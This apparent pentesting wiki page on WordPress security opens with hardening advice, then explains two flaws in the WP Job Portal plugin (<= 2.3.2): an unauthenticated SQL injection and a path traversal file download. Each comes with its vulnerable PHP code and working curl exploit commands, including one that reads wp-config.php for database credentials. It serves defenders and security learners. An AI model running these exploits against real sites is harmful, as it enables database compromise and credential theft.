# WordPress - Wordpress Protection

## WordPress Protection


### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:

```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```

Also, **only install trustable WordPress plugins and themes**.

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Other Recommendations**

- Remove default **admin** user
- Use **strong passwords** and **2FA**
- Periodically **review** users **permissions**
- **Limit login attempts** to prevent Brute Force attacks
- Rename **`wp-admin.php`** file and only allow access internally or from certain IP addresses.

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin exposed a **savecategory** task that ultimately executes the following vulnerable code inside `modules/category/model.php::validateFormData()`:

```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
    $inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
        . wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```

Issues introduced by this snippet:

1. **Unsanitised user input** – `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** – no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. Grab a fresh nonce:
   ```bash
   curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
   ```
2. Inject arbitrary SQL by abusing `parentid`:
   ```bash
   curl -X POST https://victim.com/wp-admin/admin-post.php \
        -d 'task=savecategory' \
        -d '_wpnonce=<nonce>' \
        -d 'parentid=0 OR 1=1-- -' \
        -d 'cat_title=pwn' -d 'id='
   ```
   The response discloses the result of the injected query or alters the database, proving SQLi.

### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Another task, **downloadcustomfile**, allowed visitors to download **any file on disk** via path traversal.  The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:

```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```

`$file_name` is attacker-controlled and concatenated **without sanitisation**.  Again, the only gate is a **CSRF nonce** that can be fetched from the resume page.

#### Exploitation

```bash
curl -G https://victim.com/wp-admin/admin-post.php \
     --data-urlencode 'task=downloadcustomfile' \
     --data-urlencode '_wpnonce=<nonce>' \
     --data-urlencode 'upload_for=resume' \
     --data-urlencode 'entity_id=1' \
     --data-urlencode 'file_name=../../../wp-config.php'
```
The server responds with the contents of `wp-config.php`, leaking DB credentials and auth keys.
